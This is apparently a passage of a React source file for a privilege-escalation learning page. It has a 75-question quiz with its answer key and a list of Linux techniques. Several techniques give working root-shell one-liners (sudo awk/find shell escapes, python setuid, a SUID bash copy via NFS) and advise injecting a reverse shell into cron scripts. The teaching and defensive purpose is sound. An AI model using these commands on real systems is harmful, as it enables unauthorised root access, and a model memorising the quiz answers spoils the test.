import React, { useState } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Container,
  Typography,
  Paper,
  Tabs,
  Tab,
  Chip,
  Button,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Grid,
  Card,
  CardContent,
  alpha,
  Divider,
  Alert,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Stepper,
  Step,
  StepLabel,
  StepContent,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import SecurityIcon from "@mui/icons-material/Security";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import LockIcon from "@mui/icons-material/Lock";
import BugReportIcon from "@mui/icons-material/BugReport";
import TerminalIcon from "@mui/icons-material/Terminal";
import ComputerIcon from "@mui/icons-material/Computer";
import BuildIcon from "@mui/icons-material/Build";
import SchoolIcon from "@mui/icons-material/School";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import AdminPanelSettingsIcon from "@mui/icons-material/AdminPanelSettings";
import KeyIcon from "@mui/icons-material/Key";
import StorageIcon from "@mui/icons-material/Storage";
import SettingsIcon from "@mui/icons-material/Settings";
import QuizIcon from "@mui/icons-material/Quiz";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import FolderIcon from "@mui/icons-material/Folder";
import GroupIcon from "@mui/icons-material/Group";
import AccessTimeIcon from "@mui/icons-material/AccessTime";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import MemoryIcon from "@mui/icons-material/Memory";
import DataObjectIcon from "@mui/icons-material/DataObject";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import { Link, useNavigate } from "react-router-dom";

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
    </div>
  );
}

interface CodeBlockProps {
  title: string;
  code: string;
  language?: string;
}

function CodeBlock({ title, code, language = "bash" }: CodeBlockProps) {
  const handleCopy = () => {
    navigator.clipboard.writeText(code);
  };

  return (
    <Paper sx={{ bgcolor: "#0d1117", borderRadius: 2, overflow: "hidden", mb: 2 }}>
      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", px: 2, py: 1, bgcolor: "#161b22" }}>
        <Typography variant="caption" sx={{ color: "#8b949e" }}>{title}</Typography>
        <Tooltip title="Copy">
          <IconButton size="small" onClick={handleCopy} sx={{ color: "#8b949e" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Box sx={{ p: 2, overflowX: "auto" }}>
        <pre style={{ margin: 0, color: "#c9d1d9", fontSize: "0.85rem", fontFamily: "Monaco, Consolas, monospace" }}>
          {code}
        </pre>
      </Box>
    </Paper>
  );
}

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#f59e0b";

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Foundations",
    question: "What is privilege escalation?",
    options: [
      "Gaining higher privileges than originally granted",
      "Moving laterally between systems without new privileges",
      "Encrypting files to evade detection",
      "Resetting a user's password",
    ],
    correctAnswer: 0,
    explanation: "Privilege escalation means obtaining permissions beyond the current level.",
  },
  {
    id: 2,
    topic: "Foundations",
    question: "What is the difference between vertical and horizontal escalation?",
    options: [
      "Vertical gains higher privileges; horizontal accesses a peer account",
      "Vertical uses Linux; horizontal uses Windows",
      "Vertical uses network exploits; horizontal uses phishing",
      "Vertical requires MFA; horizontal does not",
    ],
    correctAnswer: 0,
    explanation: "Vertical increases privilege level, while horizontal moves between peers.",
  },
  {
    id: 3,
    topic: "Foundations",
    question: "Why is enumeration critical before attempting escalation?",
    options: [
      "It reveals misconfigurations and attack paths",
      "It guarantees root access immediately",
      "It disables logging automatically",
      "It patches vulnerable services",
    ],
    correctAnswer: 0,
    explanation: "Enumeration uncovers weak permissions, services, and credentials to abuse.",
  },
  {
    id: 4,
    topic: "Foundations",
    question: "The principle of least privilege means:",
    options: [
      "Users have only the permissions needed for their tasks",
      "All users are local administrators",
      "Services should run as root by default",
      "Passwords should never expire",
    ],
    correctAnswer: 0,
    explanation: "Least privilege limits access to only what is required.",
  },
  {
    id: 5,
    topic: "Linux Basics",
    question: "What does the SUID bit do on Linux executables?",
    options: [
      "Executes the file with the owner's privileges",
      "Forces the file to run in a sandbox",
      "Makes the file read-only to all users",
      "Disables the file from running as root",
    ],
    correctAnswer: 0,
    explanation: "SUID runs the program with the file owner's effective UID.",
  },
  {
    id: 6,
    topic: "Linux Basics",
    question: "What does SGID on a directory typically ensure?",
    options: [
      "New files inherit the directory group",
      "All files become executable",
      "The directory is hidden from non-root users",
      "Only root can delete files",
    ],
    correctAnswer: 0,
    explanation: "SGID on directories makes new files inherit the group ID.",
  },
  {
    id: 7,
    topic: "Linux Basics",
    question: "What does `sudo -l` show?",
    options: [
      "Commands the user can run with sudo",
      "All listening network ports",
      "System uptime and load",
      "Kernel version and modules",
    ],
    correctAnswer: 0,
    explanation: "`sudo -l` lists permitted sudo commands for the current user.",
  },
  {
    id: 8,
    topic: "Linux Basics",
    question: "Why is `NOPASSWD` in sudoers risky?",
    options: [
      "It allows privileged commands without a password",
      "It breaks sudo logging",
      "It disables all user accounts",
      "It forces the user to reset passwords",
    ],
    correctAnswer: 0,
    explanation: "NOPASSWD removes a key control for privileged command execution.",
  },
  {
    id: 9,
    topic: "Linux Basics",
    question: "PATH hijacking occurs when:",
    options: [
      "A privileged program runs a command without a full path",
      "A user changes their shell to zsh",
      "A system uses absolute paths everywhere",
      "The PATH variable is read-only",
    ],
    correctAnswer: 0,
    explanation: "If a binary is invoked without a full path, attackers can plant a fake one earlier in PATH.",
  },
  {
    id: 10,
    topic: "Linux Basics",
    question: "Why can cron jobs be a privilege escalation risk?",
    options: [
      "Writable scripts can be modified to run as root",
      "Cron disables file permissions",
      "Cron always runs with no logging",
      "Cron forces all users to share passwords",
    ],
    correctAnswer: 0,
    explanation: "If cron runs a writable script as root, it can be hijacked.",
  },
  {
    id: 11,
    topic: "Linux Basics",
    question: "Linux capabilities provide:",
    options: [
      "Fine-grained privileges on binaries",
      "Full root access to all users",
      "Automatic encryption for files",
      "A replacement for sudoers",
    ],
    correctAnswer: 0,
    explanation: "Capabilities grant specific privileges without full root.",
  },
  {
    id: 12,
    topic: "Linux Basics",
    question: "What does `cap_setuid` allow a binary to do?",
    options: [
      "Change its effective UID, potentially to root",
      "Disable all network access",
      "Create kernel modules",
      "Modify SELinux policies",
    ],
    correctAnswer: 0,
    explanation: "cap_setuid allows changing the effective UID to another user.",
  },
  {
    id: 13,
    topic: "Linux Basics",
    question: "What does a world-writable `/etc/shadow` allow?",
    options: [
      "Modifying password hashes",
      "Disabling all user accounts",
      "Changing kernel settings",
      "Removing SUID bits automatically",
    ],
    correctAnswer: 0,
    explanation: "Writable shadow files allow attackers to set new password hashes.",
  },
  {
    id: 14,
    topic: "Linux Basics",
    question: "When are kernel exploits typically used for escalation?",
    options: [
      "When a local kernel vulnerability exists",
      "Only when no user accounts exist",
      "When DNS is blocked",
      "Only on macOS systems",
    ],
    correctAnswer: 0,
    explanation: "Kernel exploits require a local vulnerability and access to the system.",
  },
  {
    id: 15,
    topic: "Credentials",
    question: "Why check configuration files during enumeration?",
    options: [
      "They may contain plaintext credentials",
      "They always store kernel exploits",
      "They remove the need for enumeration",
      "They prevent privilege escalation",
    ],
    correctAnswer: 0,
    explanation: "Config files often contain secrets that can be reused.",
  },
  {
    id: 16,
    topic: "Windows Basics",
    question: "What is UAC on Windows primarily?",
    options: [
      "An elevation prompt, not a full security boundary",
      "A replacement for antivirus software",
      "A network firewall",
      "A kernel-level sandbox",
    ],
    correctAnswer: 0,
    explanation: "UAC prompts for elevation but does not fully isolate admin context.",
  },
  {
    id: 17,
    topic: "Windows Basics",
    question: "An unquoted service path vulnerability occurs when:",
    options: [
      "A service path contains spaces and is not quoted",
      "A service uses TLS for communications",
      "A service runs as a low-priv user",
      "A service is disabled at boot",
    ],
    correctAnswer: 0,
    explanation: "Unquoted paths allow execution of attacker-controlled binaries in path segments.",
  },
  {
    id: 18,
    topic: "Windows Basics",
    question: "Weak service permissions allow an attacker to:",
    options: [
      "Replace the service binary or change its configuration",
      "Disable all Windows updates",
      "Encrypt the system disk by default",
      "Change the kernel version",
    ],
    correctAnswer: 0,
    explanation: "Writable service paths or configs enable binary replacement attacks.",
  },
  {
    id: 19,
    topic: "Windows Basics",
    question: "The AlwaysInstallElevated policy allows:",
    options: [
      "MSI installations to run as SYSTEM",
      "Untrusted drivers to load automatically",
      "Users to bypass all password policies",
      "Unsigned scripts to run as kernel code",
    ],
    correctAnswer: 0,
    explanation: "AlwaysInstallElevated runs MSI packages with elevated privileges.",
  },
  {
    id: 20,
    topic: "Windows Basics",
    question: "SeImpersonatePrivilege is commonly abused to:",
    options: [
      "Impersonate tokens (e.g., Potato attacks)",
      "Disable network access",
      "Force BitLocker encryption",
      "Reset domain passwords",
    ],
    correctAnswer: 0,
    explanation: "This privilege enables token impersonation attacks for elevation.",
  },
  {
    id: 21,
    topic: "Windows Enumeration",
    question: "What does `whoami /priv` show?",
    options: [
      "Enabled privileges for the current user",
      "All installed Windows updates",
      "Current network connections",
      "Local group memberships only",
    ],
    correctAnswer: 0,
    explanation: "The command lists user privileges and their status.",
  },
  {
    id: 22,
    topic: "Windows Enumeration",
    question: "What is `icacls` commonly used for?",
    options: [
      "Viewing file and folder ACLs",
      "Extracting password hashes",
      "Listing running services",
      "Editing registry keys",
    ],
    correctAnswer: 0,
    explanation: "icacls shows access control lists for files and directories.",
  },
  {
    id: 23,
    topic: "Credentials",
    question: "Why is local admin password reuse dangerous?",
    options: [
      "It enables easy escalation and spread across hosts",
      "It improves system performance",
      "It guarantees strong passwords",
      "It disables logging by default",
    ],
    correctAnswer: 0,
    explanation: "Reuse lets attackers pivot and escalate using the same credentials.",
  },
  {
    id: 24,
    topic: "Defense",
    question: "How does LAPS help reduce escalation risk?",
    options: [
      "It rotates local admin passwords uniquely per host",
      "It disables all admin accounts",
      "It blocks all SMB traffic",
      "It forces 2FA for every login",
    ],
    correctAnswer: 0,
    explanation: "LAPS prevents password reuse by rotating per-host admin credentials.",
  },
  {
    id: 25,
    topic: "Credentials",
    question: "Credential dumping often targets:",
    options: [
      "LSASS memory or the SAM database",
      "DNS cache entries",
      "Browser history files only",
      "System event logs exclusively",
    ],
    correctAnswer: 0,
    explanation: "LSASS and SAM store hashes and secrets used for authentication.",
  },
  {
    id: 26,
    topic: "Linux Enumeration",
    question: "What does `find / -perm -4000` enumerate?",
    options: [
      "SUID binaries",
      "World-writable directories",
      "Running processes",
      "Open network ports",
    ],
    correctAnswer: 0,
    explanation: "The command finds files with the SUID bit set.",
  },
  {
    id: 27,
    topic: "Linux Enumeration",
    question: "What does `getcap -r /` list?",
    options: [
      "Files with Linux capabilities set",
      "All open network sockets",
      "All scheduled cron jobs",
      "Loaded kernel modules",
    ],
    correctAnswer: 0,
    explanation: "getcap lists binaries with assigned capabilities.",
  },
  {
    id: 28,
    topic: "Linux Abuse",
    question: "Why is sudo access to `vim` dangerous?",
    options: [
      "vim can spawn a shell as root",
      "vim disables all file permissions",
      "vim removes audit logs automatically",
      "vim bypasses sudo authentication forever",
    ],
    correctAnswer: 0,
    explanation: "Many editors allow shell escapes when run with sudo.",
  },
  {
    id: 29,
    topic: "Linux Abuse",
    question: "Why is sudo access to `less` or `man` risky?",
    options: [
      "They support shell escapes under sudo",
      "They disable SELinux permanently",
      "They reveal kernel source code",
      "They remove cron jobs",
    ],
    correctAnswer: 0,
    explanation: "Pager tools can execute commands when run with sudo.",
  },
  {
    id: 30,
    topic: "Linux Abuse",
    question: "GTFOBins is best described as:",
    options: [
      "A catalog of binaries that can be abused for escalation",
      "A Linux package manager",
      "A kernel exploit framework",
      "A Windows-only enumeration tool",
    ],
    correctAnswer: 0,
    explanation: "GTFOBins documents ways to abuse common binaries.",
  },
  {
    id: 31,
    topic: "Linux Abuse",
    question: "LD_PRELOAD abuse is possible when:",
    options: [
      "Environment variables are preserved for sudo",
      "The kernel is fully patched",
      "SUID is disabled system-wide",
      "No shared libraries are installed",
    ],
    correctAnswer: 0,
    explanation: "Preserved environment variables can allow loading malicious libraries.",
  },
  {
    id: 32,
    topic: "Linux Abuse",
    question: "Writable `/etc/sudoers.d` allows an attacker to:",
    options: [
      "Add or modify sudo rules for elevation",
      "Disable networking entirely",
      "Reset BIOS passwords",
      "Delete user home directories",
    ],
    correctAnswer: 0,
    explanation: "Sudoers files control which commands can run with elevated rights.",
  },
  {
    id: 33,
    topic: "Linux Abuse",
    question: "Membership in the `docker` group typically implies:",
    options: [
      "Root access via containers",
      "Read-only access to logs",
      "No ability to run containers",
      "Automatic removal of SUID bits",
    ],
    correctAnswer: 0,
    explanation: "Docker group members can mount the host filesystem from containers.",
  },
  {
    id: 34,
    topic: "Linux Abuse",
    question: "Membership in the `lxd` group typically implies:",
    options: [
      "Root access via privileged containers",
      "Read-only access to package caches",
      "No ability to run containers",
      "Automatic MFA enforcement",
    ],
    correctAnswer: 0,
    explanation: "LXD can be abused to mount the host filesystem as root.",
  },
  {
    id: 35,
    topic: "Linux Abuse",
    question: "What does `no_root_squash` on an NFS export allow?",
    options: [
      "Remote root retains root privileges on the share",
      "All files become read-only",
      "Only anonymous access is permitted",
      "Encryption is enforced for all files",
    ],
    correctAnswer: 0,
    explanation: "no_root_squash maps remote root to local root on the share.",
  },
  {
    id: 36,
    topic: "Windows Enumeration",
    question: "What does `sc qc` show on Windows?",
    options: [
      "Service configuration and binary path",
      "Current network routes",
      "Installed browser extensions",
      "All user passwords",
    ],
    correctAnswer: 0,
    explanation: "sc qc reveals how a service is configured and where its binary resides.",
  },
  {
    id: 37,
    topic: "Windows Enumeration",
    question: "What does `schtasks /query` help you find?",
    options: [
      "Scheduled tasks and their run contexts",
      "Open SMB sessions",
      "Loaded device drivers",
      "Registry run keys only",
    ],
    correctAnswer: 0,
    explanation: "It lists scheduled tasks that may run with elevated permissions.",
  },
  {
    id: 38,
    topic: "Windows Abuse",
    question: "A misconfigured scheduled task can allow:",
    options: [
      "Replacing a script that runs as SYSTEM",
      "Disabling UAC permanently",
      "Changing kernel version on reboot",
      "Bypassing all authentication",
    ],
    correctAnswer: 0,
    explanation: "Writable task scripts or binaries can be replaced for elevation.",
  },
  {
    id: 39,
    topic: "Windows Abuse",
    question: "DLL search order hijacking works when:",
    options: [
      "A program loads a DLL from a writable directory",
      "All DLLs are signed and verified",
      "Safe DLL search mode is enabled",
      "Only kernel drivers are loaded",
    ],
    correctAnswer: 0,
    explanation: "Writable directories in the search path allow malicious DLLs to load.",
  },
  {
    id: 40,
    topic: "Windows Abuse",
    question: "Windows PATH hijacking allows an attacker to:",
    options: [
      "Execute a malicious binary earlier in the PATH",
      "Disable all event logging",
      "Force WinRM to use HTTPS",
      "Reset all user passwords",
    ],
    correctAnswer: 0,
    explanation: "If a program relies on PATH order, attackers can insert a fake binary.",
  },
  {
    id: 41,
    topic: "Windows Privileges",
    question: "What does SeDebugPrivilege allow?",
    options: [
      "Access to other process memory such as LSASS",
      "Changing disk encryption settings",
      "Resetting domain admin passwords",
      "Blocking all network traffic",
    ],
    correctAnswer: 0,
    explanation: "SeDebugPrivilege enables reading and manipulating other processes.",
  },
  {
    id: 42,
    topic: "Windows Privileges",
    question: "What does SeBackupPrivilege allow?",
    options: [
      "Reading protected files",
      "Creating new domain accounts",
      "Disabling antivirus services",
      "Changing kernel drivers",
    ],
    correctAnswer: 0,
    explanation: "Backup privilege bypasses file permission checks for reads.",
  },
  {
    id: 43,
    topic: "Windows Privileges",
    question: "What does SeRestorePrivilege allow?",
    options: [
      "Writing or restoring protected files",
      "Changing local firewall rules only",
      "Accessing browser cookies",
      "Resetting passwords without logs",
    ],
    correctAnswer: 0,
    explanation: "Restore privilege bypasses file permission checks for writes.",
  },
  {
    id: 44,
    topic: "Windows Privileges",
    question: "Token impersonation is:",
    options: [
      "Using another user's token to access resources",
      "Changing a user's password hash",
      "Removing a user from all groups",
      "Encrypting a user profile",
    ],
    correctAnswer: 0,
    explanation: "Impersonation uses another security token to act as that user.",
  },
  {
    id: 45,
    topic: "Windows Privileges",
    question: "Delegation differs from impersonation because:",
    options: [
      "Delegation can access remote resources on behalf of a user",
      "Delegation disables network access",
      "Impersonation requires kernel access",
      "Impersonation is only for Linux",
    ],
    correctAnswer: 0,
    explanation: "Delegation allows credentials to be used on remote systems.",
  },
  {
    id: 46,
    topic: "Credentials",
    question: "Why are plaintext credentials in scripts dangerous?",
    options: [
      "They enable immediate access without cracking",
      "They increase system uptime",
      "They prevent log collection",
      "They are always encrypted automatically",
    ],
    correctAnswer: 0,
    explanation: "Plaintext credentials can be reused quickly by attackers.",
  },
  {
    id: 47,
    topic: "Credentials",
    question: "Why are exposed SSH private keys risky?",
    options: [
      "They can be reused to access other systems",
      "They disable multi-factor authentication",
      "They automatically grant domain admin",
      "They prevent file encryption",
    ],
    correctAnswer: 0,
    explanation: "Private keys allow authentication without a password.",
  },
  {
    id: 48,
    topic: "Linux Basics",
    question: "A sudoers entry of `ALL=(ALL) ALL` means:",
    options: [
      "The user can run any command as any user",
      "The user cannot use sudo at all",
      "The user can only run read-only commands",
      "The user can only run commands as root with a password",
    ],
    correctAnswer: 0,
    explanation: "This grants full sudo access without restrictions.",
  },
  {
    id: 49,
    topic: "Linux Basics",
    question: "What does `sudo -u` allow a user to do?",
    options: [
      "Run a command as another user",
      "Disable sudo logging",
      "Reset all passwords",
      "Bypass file permissions for all users",
    ],
    correctAnswer: 0,
    explanation: "`sudo -u` switches the target user for a command.",
  },
  {
    id: 50,
    topic: "Linux Abuse",
    question: "What did the PwnKit (pkexec) vulnerability allow?",
    options: [
      "Local privilege escalation to root",
      "Remote code execution without authentication",
      "Automatic patching of services",
      "Disabling all logging",
    ],
    correctAnswer: 0,
    explanation: "PwnKit was a local escalation flaw in polkit's pkexec.",
  },
  {
    id: 51,
    topic: "Linux Abuse",
    question: "Why can `sudo` access to `tar` be abused?",
    options: [
      "Checkpoint actions can execute arbitrary commands",
      "tar bypasses all authentication by default",
      "tar disables file permissions system-wide",
      "tar encrypts the filesystem automatically",
    ],
    correctAnswer: 0,
    explanation: "Certain tar options allow command execution when run with sudo.",
  },
  {
    id: 52,
    topic: "Linux Abuse",
    question: "Why can `sudo` access to `find` be abused?",
    options: [
      "`-exec` can run arbitrary commands",
      "find disables SELinux permanently",
      "find replaces all binaries on disk",
      "find resets sudoers files",
    ],
    correctAnswer: 0,
    explanation: "The `-exec` option can run commands with elevated privileges.",
  },
  {
    id: 53,
    topic: "Windows Abuse",
    question: "Writable service registry keys allow an attacker to:",
    options: [
      "Change ImagePath to a malicious binary",
      "Disable kernel updates permanently",
      "Reset all local passwords",
      "Bypass BitLocker encryption",
    ],
    correctAnswer: 0,
    explanation: "If service config is writable, the binary path can be hijacked.",
  },
  {
    id: 54,
    topic: "Windows Abuse",
    question: "Weak permissions on program directories allow:",
    options: [
      "Replacing service binaries with malicious versions",
      "Changing BIOS settings",
      "Disabling firewall rules",
      "Deleting user accounts",
    ],
    correctAnswer: 0,
    explanation: "Writable program directories allow binary replacement attacks.",
  },
  {
    id: 55,
    topic: "Windows Enumeration",
    question: "What does `net localgroup administrators` show?",
    options: [
      "Members of the local Administrators group",
      "All domain users",
      "All running processes",
      "All network shares",
    ],
    correctAnswer: 0,
    explanation: "This command lists local admin group membership.",
  },
  {
    id: 56,
    topic: "Windows Enumeration",
    question: "What does `wmic qfe` show?",
    options: [
      "Installed patches and updates",
      "Active network connections",
      "Current user privileges",
      "Registry autoruns",
    ],
    correctAnswer: 0,
    explanation: "wmic qfe reports installed hotfixes and updates.",
  },
  {
    id: 57,
    topic: "Windows Enumeration",
    question: "What does `net user` show?",
    options: [
      "Local user accounts",
      "Open network ports",
      "Installed drivers",
      "Domain trust relationships",
    ],
    correctAnswer: 0,
    explanation: "net user lists local accounts on the system.",
  },
  {
    id: 58,
    topic: "Windows Tools",
    question: "PowerUp is used for:",
    options: [
      "Windows privilege escalation enumeration",
      "DNS exfiltration",
      "Kernel patching",
      "File integrity monitoring",
    ],
    correctAnswer: 0,
    explanation: "PowerUp checks for common Windows privesc misconfigurations.",
  },
  {
    id: 59,
    topic: "Windows Tools",
    question: "Seatbelt is used for:",
    options: [
      "System enumeration and security posture checks",
      "Generating phishing emails",
      "Encrypting disks",
      "Blocking USB devices",
    ],
    correctAnswer: 0,
    explanation: "Seatbelt gathers host information to identify weaknesses.",
  },
  {
    id: 60,
    topic: "Tools",
    question: "LinPEAS/WinPEAS are used for:",
    options: [
      "Automated privilege escalation enumeration",
      "Credential vault management",
      "Disk encryption",
      "Firewall configuration",
    ],
    correctAnswer: 0,
    explanation: "PEAS tools automate discovery of escalation vectors.",
  },
  {
    id: 61,
    topic: "Credentials",
    question: "Kerberoasting targets:",
    options: [
      "Service account hashes with SPNs",
      "Local user browser cookies",
      "DNS cache entries",
      "Windows update packages",
    ],
    correctAnswer: 0,
    explanation: "Kerberoasting targets service account tickets for offline cracking.",
  },
  {
    id: 62,
    topic: "Credentials",
    question: "AS-REP roasting is possible when:",
    options: [
      "An account does not require Kerberos pre-authentication",
      "A user has no local profile",
      "SMB signing is enabled",
      "RDP is disabled",
    ],
    correctAnswer: 0,
    explanation: "Accounts without pre-auth can yield AS-REP hashes for cracking.",
  },
  {
    id: 63,
    topic: "Credentials",
    question: "Weak service account passwords can lead to:",
    options: [
      "Privileged access if the account is high-privilege",
      "Automatic detection of all attacks",
      "Removal of domain admins",
      "Lower system uptime",
    ],
    correctAnswer: 0,
    explanation: "Compromised service accounts can grant broad privileges.",
  },
  {
    id: 64,
    topic: "Credentials",
    question: "Password spraying is:",
    options: [
      "Trying a few passwords across many accounts",
      "Trying many passwords against one account",
      "Brute-forcing the kernel",
      "Resetting passwords via email",
    ],
    correctAnswer: 0,
    explanation: "Spraying avoids lockouts by using limited guesses across users.",
  },
  {
    id: 65,
    topic: "Credentials",
    question: "A strong password policy helps mitigate:",
    options: [
      "Brute force and password spraying",
      "DNS cache poisoning",
      "Kernel exploits",
      "Browser extension attacks",
    ],
    correctAnswer: 0,
    explanation: "Strong passwords reduce the success of guessing attacks.",
  },
  {
    id: 66,
    topic: "Defense",
    question: "Why remove unnecessary SUID/SGID bits?",
    options: [
      "It reduces escalation paths",
      "It improves DNS performance",
      "It disables all sudo use",
      "It enables kernel debugging",
    ],
    correctAnswer: 0,
    explanation: "Fewer privileged binaries mean fewer escalation opportunities.",
  },
  {
    id: 67,
    topic: "Defense",
    question: "Why restrict sudoers entries?",
    options: [
      "To limit command abuse and reduce escalation risk",
      "To increase network bandwidth",
      "To avoid patching",
      "To prevent logging",
    ],
    correctAnswer: 0,
    explanation: "Tight sudo policies reduce abuse of privileged commands.",
  },
  {
    id: 68,
    topic: "Defense",
    question: "Why keep OS and applications patched?",
    options: [
      "To fix known local privilege escalation bugs",
      "To disable all services",
      "To remove the need for backups",
      "To avoid user training",
    ],
    correctAnswer: 0,
    explanation: "Patching removes known vulnerabilities used for escalation.",
  },
  {
    id: 69,
    topic: "Defense",
    question: "Why enforce least privilege for users and services?",
    options: [
      "To limit the impact of a compromise",
      "To increase CPU performance",
      "To prevent all network access",
      "To allow password reuse",
    ],
    correctAnswer: 0,
    explanation: "Least privilege limits what attackers can do with a foothold.",
  },
  {
    id: 70,
    topic: "Defense",
    question: "Why audit service permissions regularly?",
    options: [
      "To prevent binary replacement and config abuse",
      "To disable system updates",
      "To remove user accounts",
      "To speed up boot times",
    ],
    correctAnswer: 0,
    explanation: "Auditing finds weak permissions that enable escalation.",
  },
  {
    id: 71,
    topic: "Defense",
    question: "Why disable unused services?",
    options: [
      "It reduces attack surface and escalation opportunities",
      "It guarantees all users are admins",
      "It removes the need for logging",
      "It increases privileges for everyone",
    ],
    correctAnswer: 0,
    explanation: "Fewer services means fewer misconfigurations to exploit.",
  },
  {
    id: 72,
    topic: "Detection",
    question: "Monitoring for new services can help detect:",
    options: [
      "Service-based escalation attempts",
      "Normal user logins",
      "Routine backups",
      "Software updates from vendors",
    ],
    correctAnswer: 0,
    explanation: "New services are a common indicator of privilege escalation.",
  },
  {
    id: 73,
    topic: "Detection",
    question: "Monitoring for new scheduled tasks can help detect:",
    options: [
      "Task-based escalation attempts",
      "Normal patch cycles",
      "User profile creation",
      "DNS updates",
    ],
    correctAnswer: 0,
    explanation: "Attackers often use scheduled tasks to run elevated commands.",
  },
  {
    id: 74,
    topic: "Defense",
    question: "How does MFA on admin accounts help?",
    options: [
      "It reduces the impact of stolen passwords",
      "It removes the need for patching",
      "It disables credential dumping",
      "It prevents all service creation",
    ],
    correctAnswer: 0,
    explanation: "MFA adds an additional factor beyond a stolen password.",
  },
  {
    id: 75,
    topic: "Defense",
    question: "Why is privilege separation important?",
    options: [
      "It limits the blast radius of a compromise",
      "It forces all users to share accounts",
      "It disables audit logging",
      "It increases attack surface",
    ],
    correctAnswer: 0,
    explanation: "Separation ensures a single compromise does less damage.",
  },
];

export default function PrivilegeEscalationGuidePage() {
  const navigate = useNavigate();
  const [tabValue, setTabValue] = useState(0);

  const handleTabChange = (_event: React.SyntheticEvent, newValue: number) => {
    setTabValue(newValue);
  };

  // Linux privesc techniques with detailed exploitation steps
  const linuxTechniques = [
    { 
      technique: "SUID/SGID Binaries", 
      description: "Binaries with Set-UID/GID bits that run with elevated privileges", 
      difficulty: "Easy", 
      tools: "find, GTFOBins",
      howItWorks: "SUID (Set User ID) binaries execute with the file owner's permissions. If a SUID binary owned by root has vulnerabilities or allows shell escape, it can be used to gain root access.",
      detection: "find / -perm -4000 -type f 2>/dev/null",
      exploitation: [
        "Find SUID binaries: find / -perm -4000 -type f 2>/dev/null",
        "Check GTFOBins for known exploits",
        "Example with find: find . -exec /bin/sh -p \\; -quit",
        "Example with vim: vim -c ':!/bin/sh'"
      ]
    },
    { 
      technique: "Sudo Misconfigurations", 
      description: "Improper sudo rules allowing command execution as root", 
      difficulty: "Easy", 
      tools: "sudo -l, GTFOBins",
      howItWorks: "sudo allows users to run commands as another user. Misconfigurations like NOPASSWD, wildcards, or allowing dangerous binaries can be exploited.",
      detection: "sudo -l",
      exploitation: [
        "Check permissions: sudo -l",
        "Look for NOPASSWD entries",
        "Check for env_keep+=LD_PRELOAD",
        "Example with awk: sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        "Example with find: sudo find /etc -exec /bin/sh \\; -quit"
      ]
    },
    { 
      technique: "Cron Jobs", 
      description: "Scheduled tasks running as root with writable scripts", 
      difficulty: "Medium", 
      tools: "crontab, pspy",
      howItWorks: "Cron jobs run periodically with specific user privileges. If a script run by root is writable or references writable files, it can be modified for privilege escalation.",
      detection: "cat /etc/crontab; ls -la /etc/cron.*; pspy",
      exploitation: [
        "Check crontabs: cat /etc/crontab",
        "Monitor running processes: ./pspy64",
        "Check script permissions: ls -la /path/to/script",
        "Inject reverse shell into writable script",
        "Wait for cron execution"
      ]
    },
    { 
      technique: "Kernel Exploits", 
      description: "Exploiting vulnerable kernel versions for root access", 
      difficulty: "Hard", 
      tools: "linux-exploit-suggester",
      howItWorks: "Kernel vulnerabilities can provide direct root access by exploiting bugs in the kernel code. These exploits can be unstable but are often very effective.",
      detection: "uname -r; ./linux-exploit-suggester.sh",
      exploitation: [
        "Get kernel version: uname -r",
        "Run exploit suggester",
        "Research CVE for specific kernel",
        "Common exploits: DirtyPipe, DirtyCow, Overlayfs",
        "Compile and run exploit carefully"
      ]
    },
    { 
      technique: "Capabilities", 
      description: "Linux capabilities that can be abused for privilege escalation", 
      difficulty: "Medium", 
      tools: "getcap, GTFOBins",
      howItWorks: "Linux capabilities divide root's powers into distinct units. Some capabilities like CAP_SETUID, CAP_NET_BIND_SERVICE, or CAP_DAC_READ_SEARCH can be abused for escalation.",
      detection: "getcap -r / 2>/dev/null",
      exploitation: [
        "Find capabilities: getcap -r / 2>/dev/null",
        "CAP_SETUID on python: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "CAP_DAC_READ_SEARCH on tar: tar xvf /etc/shadow",
        "Check GTFOBins for capability exploits"
      ]
    },
    { 
      technique: "PATH Hijacking", 
      description: "Exploiting insecure PATH in scripts/binaries", 
      difficulty: "Medium", 
      tools: "strings, ltrace",
      howItWorks: "If a SUID binary or cron script calls another program without absolute path, an attacker can create a malicious binary in a writable PATH directory.",
      detection: "strings /path/to/binary; ltrace ./binary",
      exploitation: [
        "Identify relative path calls in SUID binary",
        "Check current PATH: echo $PATH",
        "Create malicious binary: echo '/bin/bash' > /tmp/service",
        "Make executable: chmod +x /tmp/service",
        "Prepend to PATH: export PATH=/tmp:$PATH",
        "Execute vulnerable SUID binary"
      ]
    },
    { 
      technique: "NFS no_root_squash", 
      description: "NFS shares allowing root file creation", 
      difficulty: "Easy", 
      tools: "showmount, mount",
      howItWorks: "NFS shares with no_root_squash option allow remote root users to create files as root. This can be used to create SUID binaries or overwrite sensitive files.",
      detection: "showmount -e target; cat /etc/exports",
      exploitation: [
        "Find NFS shares: showmount -e target",
        "Check for no_root_squash in /etc/exports",
        "Mount share as root: mount -t nfs target:/share /mnt",
        "Create SUID bash: cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash",
